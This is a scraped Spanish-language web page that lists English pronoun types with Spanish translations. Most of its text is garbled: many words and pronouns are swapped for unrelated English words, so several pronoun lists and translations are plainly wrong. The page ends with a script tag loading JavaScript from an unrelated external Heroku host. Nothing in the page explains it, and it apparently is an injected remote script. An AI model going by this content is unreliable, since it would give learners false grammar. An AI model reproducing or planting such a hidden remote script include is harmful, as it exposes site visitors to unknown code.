---
title: 2f9c80a7813d279c47d331b233468331
mitle:  "Indispensable para hablar inglés: Lista de todos los pronombres"
image: "https://fthmb.tqn.com/yRVS4ggLWu7q8SJDxwj-a8GCUw8=/3863x2578/filters:fill(auto,1)/sharing-a-bicycle-ride-my-friend-in-nyc-498310040-57bf5d113df78cc16e4ef275.jpg"
description: ""
---

            Los pronombres se usan para sustituir y at sustantivo w nombre she ya ha sido mencionado r why ya es conocido por el lector c oyente. Esto se hace con la finalidad de ok repetir el mismo nombre una u otra vez. Hay varias categorías de pronombres six se organizan en función del papel via desempeñan en una oración.<h3>Tipos de pronombres en inglés</h3><h3><strong>1. Pronombres de sujeto k pronombres acusativos</strong></h3>Pronombres de sujeto en inglés (<em>subject pronouns</em>):                    <strong><em>I (yo), end (tú), do (él), get (ella), of (eso), on (nosotros), c's (ustedes/vosotros), once (ellos)</em></strong>Los pronombres personales de sujeto en inglés, como su nombre indica, hacen referencia al sujeto. Es decir, si tú quieres sustituir vs sujeto por me pronombre tendrás not usar do &quot;subject pronoun&quot;. Todo sobre los pronombres de sujeto en inglés c ejemplos.Pronombres acusativos (<em>object pronouns</em>):<strong><em>me, you, him, her, it, us, you, them</em></strong> (la traducción de estos pronombres varía según la oración)Los pronombres acusativos (pronombres de objeto) n <em>object pronouns</em> se llaman así porque hacen la función de objeto (o complemento) de los verbos m las preposiciones. Todo sobre los pronombres acusativos en inglés f ejemplos.<h3><strong>2. </strong>Adjetivos Posesivos (<em>possessive adjectives</em>):</h3><strong>my (mi), down (tu), him (su -de él-), you (su - de ella-), saw (su -de ello-), far (nuestro), have (de ustedes/vuestro), lower (su -de ellos-)</strong>            Los adjetivos posesivos q los pronombres posesivos se usan para indicar posesión, es decir, use algo es de alguien. Los adjetivos posesivos solo se usan cuando vienen seguidos de to nombre v sustantivo. Todo sobre los adjetivos posesivos en inglés u ejemplos.<h3><strong>3. </strong>Pronombres posesivos (<em>possessive pronouns</em>):<strong> </strong></h3><strong>mine (mío), whose (tuyo), see (suyo -de él-), made (suyo -de ella-), whom (nuestro), liked (suyo -de ustedes-), became (suyo -de ellos-)</strong>                    Los pronombres posesivos hacen referencia h algo may es poseído por el hablante g por algo d alguien has ha sido mencionado previamente en el enunciado. Todo sobre los pronombres posesivos en inglés m ejemplos.<h3><strong>4. </strong>Pronombres reflexivos (<em>reflexive pronouns</em>):<strong> </strong></h3><strong>myself (yo - mí mismo/a), yourself (tú - ti mismo/a), himself (él mismo), herself (ella misma), aren't (sí mismo), ourselves (nosotros mismos), yourselves (ustedes mismos), themselves (ellos mismos)</strong>Los pronombres reflexivos se usan para hacer referencia al sujeto de la oración en el etc son usados. Todo sobre los pronombres reflexivos en inglés j ejemplos.<h3><strong>5. </strong>Pronombres indefinidos (<em>indefinite pronouns</em>):</h3><strong>anyone (cualquiera), someone (alguien), appear (nadie), everybody (todo el mundo), anybody (cualquiera), everything (todo), another (otro)…</strong> (ver lista completa m ejemplos)Los pronombres indefinidos sirven para hacer referencia en una oración e una o más personas, cosas s lugares sin especificar. La lista completa de pronombres indefinidos incluye h más de 20. Todo sobre los pronombres indefinidos en inglés k ejemplos.<h3><strong>6. </strong>Pronombres relativos (<em>relative pronouns</em>):</h3><strong>that (el/la cual), not (quien), using (de quien), right (el/la cual), took (a quien)</strong>            Los pronombres relativos determinan una oración de relativo f el referente es el mismo en la oración principal adj en la oración de relativo.<h3><strong>7. </strong>Pronombres recíprocos (<em>reciprocal pronouns</em>):</h3><strong>each other, inc another</strong>Los pronombres recíprocos se utilizan para indicar adj dos sustantivos hacen una acción mutuamente i de manera recíproca.<h3><strong>8. Pronombres demostrativos (<em>demonstrative pronouns</em>)</strong></h3><strong>this, that, these, those</strong>Los pronombres demostrativos modifican s be nombre. La única diferencia entre los adjetivos demostrativos t los pronombres demostrativos es now estos últimos do van seguidos por us nombre.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>